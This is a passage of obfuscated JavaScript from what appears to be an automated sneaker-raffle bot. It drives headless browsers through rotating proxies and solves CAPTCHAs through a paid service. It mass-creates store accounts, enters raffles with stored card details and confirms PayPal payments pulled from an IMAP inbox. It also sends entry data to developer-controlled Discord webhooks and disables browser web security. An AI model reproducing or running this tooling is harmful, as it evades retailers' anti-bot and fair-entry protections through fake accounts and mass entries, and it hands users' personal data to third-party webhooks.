            var _0x4810c2 = Math['round'](Math['random']() * (_0x224b8a()['length'] - 0x1)), _0x1247a8 = _0x224b8a()[_0x4810c2]['split'](':');
        const _0x2e8a9c = await _0x3d68d8['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1247a8[0x0] + ':' + _0x1247a8[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x537886 = await _0x2e8a9c['newPage']();
            await _0x537886['authenticate']({
                'username': '' + _0x1247a8[0x2],
                'password': '' + _0x1247a8[0x3]
            }), console['log'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x537886['setRequestInterception'](!![]), _0x537886['on']('request', _0x42ed55 => {
                _0x42ed55['resourceType']() === 'image' || _0x42ed55['resourceType']() === 'font' || _0x42ed55['resourceType']() === 'media' ? _0x42ed55['abort']() : _0x42ed55['continue']();
            }), await _0x537886['goto'](_0x15b339), await _0x38c39e(0xbb8), await _0x537886['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Filling\x20information'), await _0x537886['type']('#RegisterForm-FirstName', '' + bouncewear[_0x3a6ba2]['FirstName']), await _0x38c39e(0x226), await _0x537886['type']('#RegisterForm-LastName', '' + bouncewear[_0x3a6ba2]['LastName']), await _0x38c39e(0x226), await _0x537886['type']('#RegisterForm-email', '' + bouncewear[_0x3a6ba2]['Email']), await _0x38c39e(0x226), await _0x537886['type']('#RegisterForm-password', '' + bouncewear[_0x3a6ba2]['Password']), await _0x38c39e(0x226), await _0x537886['click']('#marketing'), console['log'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Submitting..'), await _0x537886['$eval']('#RegisterForm', _0x126c15 => _0x126c15['submit']()), await _0x38c39e(0x1f40), console['log'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x537886['solveRecaptchas'](), await _0x537886['click']('.shopify-challenge__button.btn');
            async function _0x3d4ebc() {
                for (var _0x48cbb8 = 0x0; _0x48cbb8 < 0x4; _0x48cbb8++) {
                    try {
                        console['log']('try'), await _0x537886['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20' + _0x52c84d['red']('Catpcha\x20failed,\x20retrying..')), await _0x537886['solveRecaptchas'](), await _0x537886['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x3d4ebc(), console['log'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x38c39e(0x1f4);
            try {
                await _0x537886['waitForSelector']('.featured-title'), await _0x38c39e(0x1f4), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3a6ba2]['Email'] + '\x20Generated!')), _0x4d1c4a['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x3a6ba2]['Email'] + ',' + bouncewear[_0x3a6ba2]['Password']), console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0x5e4287['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x3a6ba2]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x1519a3) {
                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1519a3));
            }
        } catch (_0x149951) {
            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x11a209[taskModule]['name'] + ']\x20Task\x20' + (_0x3a6ba2 + 0x1) + '\x20:\x20' + _0x149951));
        } finally {
            _0x2e8a9c && _0x2e8a9c['close'](), console['log']('Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
        }
    }
}
async function _0x514545(_0xdae643, _0x3b3b2b, _0x5ab479) {
    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5e160d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4b1925 = 0x0; _0x4b1925 < _0x3b3b2b['length']; _0x4b1925++) {
        _0x2ad028(_0xdae643['name'] + '\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20/\x20' + _0x3b3b2b['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92);
        var _0x56c419 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x50a338
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3b3b2b[_0x4b1925]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3b3b2b[_0x4b1925]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5e160d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x5e160d['version']
                }
            ]
        }];
        const _0x1cd5ef = { 'embeds': _0x56c419 };
        await _0x3962cc(_0x3b3b2b, _0x4b1925);
        if (_0x3b3b2b[_0x4b1925]['Email'] == '' || _0x3b3b2b[_0x4b1925]['Password'] == '' || _0x3b3b2b[_0x4b1925]['FirstName'] == '' || _0x3b3b2b[_0x4b1925]['LastName'] == '') {
            console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x3b3b2b[_0x4b1925]['Password'] == '' || _0x3b3b2b[_0x4b1925]['Password'] == undefined) && (_0x3b3b2b[_0x4b1925]['Password'] = 'ErehsaWonRaj1!');
        if (_0x5e160d['useRandomProxy'] = ![])
            var _0x4f2060 = _0x5ab479[_0x4b1925]['split'](':');
        else
            var _0x455333 = Math['round'](Math['random']() * (_0x5ab479['length'] - 0x1)), _0x4f2060 = _0x5ab479[_0x455333]['split'](':');
        const _0x41316d = await _0x3d68d8['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4f2060[0x0] + ':' + _0x4f2060[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4aa975 = await _0x41316d['newPage']();
            await _0x4aa975['authenticate']({
                'username': '' + _0x4f2060[0x2],
                'password': '' + _0x4f2060[0x3]
            }), console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4aa975['setRequestInterception'](!![]), _0x4aa975['on']('request', _0x8d506 => {
                _0x8d506['resourceType']() === 'image' || _0x8d506['resourceType']() === 'font' || _0x8d506['resourceType']() === 'media' ? _0x8d506['abort']() : _0x8d506['continue']();
            }), await _0x4aa975['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x4aa975['goto']('' + _0x3b3b2b[_0x4b1925]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x4aa975['waitForSelector']('#btnPdpAtb'), console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3b3b2b[_0x4b1925]['Size']);
            const _0x369561 = await _0x4aa975['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x37cc0b => {
                return _0x37cc0b['map'](_0x33a663 => _0x33a663['innerText']);
            }), _0x1fae32 = await _0x4aa975['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x276096 = ![];
            if (_0x3b3b2b[_0x4b1925]['Size'] == 'RANDOM') {
                var _0x376ba4 = Math['round'](Math['random']() * (_0x1fae32['length'] - 0x1));
                await _0x1fae32[_0x376ba4]['click']();
            } else
                for (var _0x45df4c = 0x0; _0x45df4c < _0x369561['length']; _0x45df4c++) {
                    if (_0x369561[_0x45df4c] != _0x3b3b2b[_0x4b1925]['Size'])
                        continue;
                    try {
                        await _0x1fae32[_0x45df4c]['click']();
                    } catch {
                        console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x276096 = !![];
                    }
                }
            if (_0x276096)
                continue;
            await _0x38c39e(0x578), await _0x4aa975['click']('#btnPdpAtb'), await _0x4aa975['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x38c39e(0x3e8), console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x4aa975['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x4aa975['waitForSelector']('#email'), await _0x4aa975['type']('#email', _0x3b3b2b[_0x4b1925]['Email']), await _0x38c39e(0x226), await _0x4aa975['click']('#guest-submit'), await _0x38c39e(0x1b58), console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4aa975['waitForSelector']('#firstname'), await _0x4aa975['type']('#firstname', _0x3b3b2b[_0x4b1925]['FirstName'], 0x1f4), await _0x38c39e(0x190), await _0x4aa975['waitForSelector']('#surname'), await _0x4aa975['type']('#surname', _0x3b3b2b[_0x4b1925]['LastName'], 0x1f4), await _0x38c39e(0x190), await _0x4aa975['waitForSelector']('#mobile'), await _0x4aa975['type']('#mobile', _0x3b3b2b[_0x4b1925]['Phone'], 0x1f4), await _0x38c39e(0x190), await _0x4aa975['click']('#enterManualDiv'), await _0x38c39e(0x5dc), await _0x4aa975['waitForSelector']('#address1'), await _0x4aa975['type']('#address1', _0x3b3b2b[_0x4b1925]['Address1'] + '\x20' + _0x3b3b2b[_0x4b1925]['HouseNumber'], 0x226), await _0x38c39e(0x384), await _0x4aa975['waitForSelector']('#address2'), await _0x4aa975['type']('#address2', '' + _0x3b3b2b[_0x4b1925]['Address2'], 0x226), await _0x38c39e(0x320);
            const _0x9c5416 = await _0x4aa975['$$eval']('#countryselect_view3\x20>\x20option', _0x257d47 => {
                return _0x257d47['map'](_0x5c57d4 => _0x5c57d4['value']);
            });
            var _0x4c59b6;
            for (var _0x4c61b5 = 0x0; _0x4c61b5 < _0x9c5416['length']; _0x4c61b5++) {
                if (_0x9c5416[_0x4c61b5]['startsWith']('' + _0x3b3b2b[_0x4b1925]['Country'])) {
                    _0x4c59b6 = _0x9c5416[_0x4c61b5];
                    break;
                }
                continue;
            }
            await _0x4aa975['select']('#countryselect_view3', '' + _0x4c59b6), await _0x4aa975['waitForSelector']('#address4'), await _0x4aa975['type']('#address4', '' + _0x3b3b2b[_0x4b1925]['City'], 0x1f4), await _0x38c39e(0x384), await _0x4aa975['waitForSelector']('#postcode'), await _0x4aa975['type']('#postcode', '' + _0x3b3b2b[_0x4b1925]['Zip'], 0x1f4), await _0x38c39e(0x4b0);
            const _0x26f2e1 = await _0x4aa975['url']();
            console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x1f146c = _0x26f2e1['split']('?')[0x1], _0x415ce1 = await _0x4aa975['$']('#co_address_submit');
            await _0x415ce1['evaluate'](_0xd0b461 => _0xd0b461['click']()), await _0x38c39e(0x1388), await _0x4aa975['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x1f146c), console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x4aa975['waitForSelector']('#paymentbuttons'), await _0x38c39e(0x1388), await _0x4aa975['click']('#paymentbuttons\x20>\x20div'), await _0x38c39e(0x1c2), await _0x4aa975['waitForSelector']('#card-number'), await _0x4aa975['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x190ba6 = await _0x4aa975['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x1bca9c = await _0x190ba6['contentFrame']();
            await _0x1bca9c['waitForSelector']('.InputContainer'), await _0x1bca9c['click']('.InputContainer\x20>\x20input'), await _0x38c39e(0x578), await _0x4aa975['type']('#card-number', '' + _0x3b3b2b[_0x4b1925]['CreditNumber']), await _0x38c39e(0xfa), await _0x4aa975['type']('#card-expiry', '' + _0x3b3b2b[_0x4b1925]['ExpiryDate']), await _0x38c39e(0xfa), await _0x4aa975['type']('#card-cvc', '' + _0x3b3b2b[_0x4b1925]['CVV']), await _0x38c39e(0x7d0), await _0x4aa975['click']('#card-button'), console['log'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x4aa975['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x16a920(_0x4f82a9, _0x1cd5ef);
            } catch {
                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x203DS\x20Failed')), _0x56c419[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x56c419[0x0]['description'] = '3DS\x20Failed', await _0x16a920(_0x233d0f, _0x1cd5ef);
            }
        } catch (_0x242d2e) {
            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0xdae643['name'] + ']\x20Task\x20' + (_0x4b1925 + 0x1) + '\x20:\x20' + _0x242d2e)), _0x56c419[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x56c419[0x0]['description'] = '' + _0x242d2e, await _0x16a920(_0x233d0f, _0x1cd5ef);
        } finally {
            _0x41316d && _0x41316d['close']();
            if (_0x4b1925 + 0x1 == _0x3b3b2b['length']) {
                console['log'](_0x52c84d['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x38c39e(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x5e160d['AfewDelay'] + '\x20ms'), await _0x38c39e(_0x5e160d['AfewDelay']);
        }
    }
}
async function _0x135ede(_0x2c32bc, _0x293c26, _0x1276da, _0x50acc, _0x1ae3e9) {
    var _0x44ff5f, _0x10103f = {}, _0x5d6220 = [], _0x3ec093 = {}, _0x259bf2 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x50acc && (_0x50acc = {});
    if (_0x293c26 != 'ver') {
        _0x2ad028(_0x1276da['name'] + '\x20Task\x20' + (_0x2c32bc + 0x1) + '\x20/\x20' + _0x50acc['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x50acc, _0x2c32bc), _0x5d6220 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x50a338
                },
                {
                    'name': 'Size',
                    'value': '' + _0x50acc[_0x2c32bc]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5e160d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0xa56f6b
                }
            ]
        }], _0x3ec093 = { 'embeds': _0x5d6220 }, _0x10103f = _0x1276da['data'];
        _0x293c26 == 'exp' ? _0x10103f['data']['attributes']['email'] = '' + _0x50acc[_0x2c32bc]['FirstName'] + _0x50acc[_0x2c32bc]['LastName'] + _0x5e160d['catchall'] : _0x10103f['data']['attributes']['email'] = '' + _0x50acc[_0x2c32bc]['Email'];
        if (_0x50acc[_0x2c32bc]['Size'] == 'RANDOM') {
        }
        _0x10103f['data']['attributes']['properties']['$first_name'] = '' + _0x50acc[_0x2c32bc]['FirstName'], _0x10103f['data']['attributes']['properties']['$last_name'] = '' + _0x50acc[_0x2c32bc]['LastName'], _0x10103f['data']['attributes']['properties']['$address1'] = _0x50acc[_0x2c32bc]['Address1'] + '\x20' + _0x50acc[_0x2c32bc]['Address2'] + '\x20' + _0x50acc[_0x2c32bc]['HouseNumber'], _0x10103f['data']['attributes']['properties']['$zip'] = '' + _0x50acc[_0x2c32bc]['Zip'], _0x10103f['data']['attributes']['properties']['$city'] = '' + _0x50acc[_0x2c32bc]['City'], _0x10103f['data']['attributes']['properties']['$country'] = '' + _0x50acc[_0x2c32bc]['Country'], _0x10103f['data']['attributes']['properties']['Size'] = '' + _0x50acc[_0x2c32bc]['Size'], _0x10103f['data']['attributes']['properties']['$phone_number'] = '' + _0x50acc[_0x2c32bc]['Phone'], _0x10103f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x50acc[_0x2c32bc]['Follower'];
    }
    if (_0x5e160d['useRandomProxy'] = ![])
        var _0x56f4ac = _0x1ae3e9[_0x2c32bc]['split'](':');
    else
        var _0x2b40f8 = Math['round'](Math['random']() * (_0x1ae3e9['length'] - 0x1)), _0x56f4ac = _0x1ae3e9[_0x2b40f8]['split'](':');
    var _0x32f0df = {
        'jar': _0xe4a440,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x1276da['url'],
        'headers': _0x1276da['headers'],
        'body': JSON['stringify'](_0x10103f),
        'proxy': 'http://' + _0x56f4ac[0x2] + ':' + _0x56f4ac[0x3] + '@' + _0x56f4ac[0x0] + ':' + _0x56f4ac[0x1]
    };
    return _0x293c26 != 'ver' && (_0x32f0df['url'] = _0x1276da['url'], _0x32f0df['headers'] = _0x1276da['headers']), _0x293c26 == 'ver' && (_0x32f0df['method'] = 'GET'), new Promise(function (_0x16804f, _0x3c413f) {
        callback = async (_0x37b3ac, _0x4941d3, _0x392a67) => {
            if (!_0x37b3ac && _0x4941d3['statusCode'] == 0xca || !_0x37b3ac && _0x4941d3['statusCode'] == 0xc8) {
                if (_0x293c26 != 'ver') {
                    var _0x5888ca = await _0x485032(_0x50acc[_0x2c32bc], _0x1276da, 'dev', ![]), _0x425e82 = await _0x485032(_0x50acc[_0x2c32bc], _0x1276da, 'pub', ![]);
                    const _0x39da6b = {
                        'succesDEVMSG': { 'embeds': [_0x5888ca] },
                        'succesPUBMSG': { 'embeds': [_0x425e82] }
                    };
                    if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                        try {
                            await _0x16a920(_0x5e160d['webhook'], _0x39da6b['succesDEVMSG']);
                        } catch {
                        }
                    await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x39da6b['succesDEVMSG']), await _0x38c39e(0xc8);
                    try {
                        await _0x16a920(_0x2766d4, _0x39da6b['succesPUBMSG']);
                    } catch {
                    }
                    _0x41f993(_0x50acc[_0x2c32bc], _0x1276da);
                }
                _0x16804f(console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x1276da['name'] + ']\x20Task\x20' + (_0x2c32bc + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x293c26 != 'ver') {
                    var _0x24827d = '' + _0x37b3ac, _0x555ab9 = await _0x485032(_0x50acc[_0x2c32bc], _0x1276da, 'dev', !![], _0x24827d), _0x483d4b = {};
                    _0x483d4b['errorDEV'] = { 'embeds': [_0x555ab9] }, _0x1ac5d5(_0x50acc[_0x2c32bc], _0x1276da), _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x483d4b['errorDEV']), await _0x16a920(_0x233d0f, _0x483d4b['errorDEV']);
                }
                _0x3c413f(console['log'](_0x21c871() + '\x20[' + _0x1276da['name'] + ']\x20Task\x20' + (_0x2c32bc + 0x1) + ':\x20' + _0x37b3ac));
            }
        };
        try {
            _0x293c26 != 'ver' && console['log'](_0x21c871() + '\x20[' + _0x1276da['name'] + ']\x20Task\x20' + (_0x2c32bc + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x10103f['data']['attributes']['email']), _0x247acd(_0x32f0df, callback);
        } catch (_0x4c346d) {
            console['log'](_0x21c871() + '\x20Task\x20' + (_0x2c32bc + 0x1) + ':\x20' + _0x4c346d);
        }
    });
}
;
async function _0x5858ec(_0x505f56, _0x3f5214, _0x20f758) {
    var _0x505f56 = [];
    async function _0xddc2ee() {
        var _0x2d3b22 = new _0xdc01cc({
            'user': _0x5e160d['masterMail'],
            'password': _0x5e160d['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x4f476f(_0x2e322e) {
            _0x2d3b22['openBox']('INBOX', ![], _0x2e322e);
        }
        _0x2d3b22['once']('ready', function () {
            _0x4f476f(function (_0x395221, _0x185ad2) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x395221)
                    throw _0x395221;
                _0x2d3b22['seq']['search'](['UNSEEN'], function (_0x527fec, _0x5a149d) {
                    if (!_0x5a149d || !_0x5a149d['length'])
                        console['log'](_0x21c871() + '\x20[' + _0x3f5214['name'] + ']\x20No\x20mails\x20found'), _0x2d3b22['end']();
                    else {
                        var _0x4ff4b0 = _0x2d3b22['seq']['fetch'](_0x5a149d, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x4ff4b0['on']('message', function (_0x32f168, _0x3d90bd) {
                            var _0x35d386 = '(#' + _0x3d90bd + ')\x20';
                            _0x32f168['on']('body', function (_0x25bb3b, _0x2f11b0) {
                                _0x31366c(_0x25bb3b, (_0x2a9a27, _0x29fe4a) => {
                                    if (_0x29fe4a['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x29fe4a['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x29fe4a['text']['split']('[')[0x2];
                                        var _0x4d8844 = mes['split'](']')[0x0];
                                        _0x505f56['push'](_0x4d8844);
                                    }
                                });
                            }), _0x32f168['once']('end', function () {
                            });
                        }), _0x4ff4b0['once']('error', function (_0x47b6e5) {
                            console['log']('Fetch\x20error:\x20' + _0x47b6e5);
                        }), _0x4ff4b0['once']('end', function () {
                            _0x2d3b22['end']();
                        });
                    }
                });
            });
        }), _0x2d3b22['once']('error', function (_0x24f415) {
            console['log'](_0x52c84d['red'](_0x24f415['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2d3b22['once']('end', async function () {
        }), _0x2d3b22['connect']();
    }
    try {
        _0xddc2ee(), await _0x38c39e(0xfa0), console['log']('Found\x20' + _0x505f56['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
    }
    var _0x2970f4;
    _0x2ad028('' + _0x3f5214);
    var _0x28018b = _0x20f758[0x0]['split'](':');
    const _0x24aa52 = await _0x3d68d8['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x28018b[0x0] + ':' + _0x28018b[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x21c871() + '\x20[' + _0x3f5214 + ']\x20Getting\x20Session');
        const _0x516f98 = await _0x24aa52['newPage']();
        await _0x516f98['authenticate']({
            'username': '' + _0x28018b[0x2],
            'password': '' + _0x28018b[0x3]
        }), await _0x516f98['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x516f98, await _0x516f98['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x21c871() + '\x20[' + _0x3f5214 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x516f98['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x21c871() + '\x20[' + _0x3f5214 + ']\x20Successfully\x20logged\x20in'), await _0x38c39e(0x2710);
        } catch (_0x26d981) {
            throw new Error('Login\x20session\x20expired\x20' + _0x26d981);
        }
        for (var _0x1f9be4 = 0x0; _0x1f9be4 < _0x505f56['length']; _0x1f9be4++) {
            console['log'](_0x21c871() + '\x20[' + _0x3f5214 + ']\x20Task\x20' + (_0x1f9be4 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x2ad028(_0x3f5214 + '\x20Task\x20' + (_0x1f9be4 + 0x1) + '\x20/\x20' + _0x505f56['length']);
            const _0x5c49ae = await _0x24aa52['newPage']();
            await _0x5c49ae['goto']('' + _0x505f56[_0x1f9be4], { 'waitUntil': 'networkidle2' }), await _0x38c39e(0xbb8);
            try {
                const _0x42aaec = await _0x5c49ae['$']('#challenge-heading');
                _0x42aaec && (console['log'](_0x21c871() + '\x20[' + _0x3f5214 + ']\x20Task\x20' + (_0x1f9be4 + 0x1) + '\x20:\x20' + _0x52c84d['yellow']('2FA\x20Required')), await _0x5c49ae['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x38c39e(0x61a8), await _0x5c49ae['waitForSelector']('#payment-submit-btn'), await _0x5c49ae['$eval']('#payment-submit-btn', _0x5692c9 => _0x5692c9['click']()), await _0x5c49ae['click']('#payment-submit-btn');
                try {
                    await _0x5c49ae['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x38c39e(0x5dc), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x3f5214 + ']\x20Task\x20' + (_0x1f9be4 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x1e5546) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x1e5546['message']);
                } finally {
                    await _0x5c49ae['close'](), await _0x38c39e(0x4650);
                }
            } catch (_0x342322) {
                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x3f5214 + ']\x20Task\x20' + (_0x1f9be4 + 0x1) + '\x20:\x20' + _0x342322));
            }
        }
    } catch (_0x542a51) {
        console['log'](_0x52c84d['red']('' + _0x542a51));
    } finally {
        await _0x24aa52['close']();
    }
}
const _0x11a209 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x438e92, _0x33dabb, _0x13775c) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4a3fb7 = 0x0; _0x4a3fb7 < _0x33dabb['length']; _0x4a3fb7++) {
                        if (_0x19f5ce != 'yes')
                            var _0x19f5ce = '', _0x17887d = 0x0;
                        var _0x2a7cc3;
                        await _0x3962cc(_0x33dabb, _0x4a3fb7), _0x2ad028(_0x438e92['name'] + '\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20/\x20' + _0x33dabb['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92);
                        var _0x5c4fb0 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x2e9a4e = Math['round'](Math['random']() * (_0x5c4fb0['length'] - 0x1));
                        _0x33dabb[_0x4a3fb7]['Size'] == 'RANDOM' && (_0x33dabb[_0x4a3fb7]['Size'] = _0x5c4fb0[_0x2e9a4e]);
                        var _0x29355 = Math['round'](Math['random']() * (_0x13775c['length'] - 0x1)), _0x2e315c = _0x13775c[_0x29355]['split'](':'), _0x228442;
                        try {
                            _0x228442 = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2e315c[0x0] + ':' + _0x2e315c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x228442 = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2e315c[0x0] + ':' + _0x2e315c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x41cbe3 = await _0x228442['newPage']();
                            await _0x41cbe3['authenticate']({
                                'username': '' + _0x2e315c[0x2],
                                'password': '' + _0x2e315c[0x3]
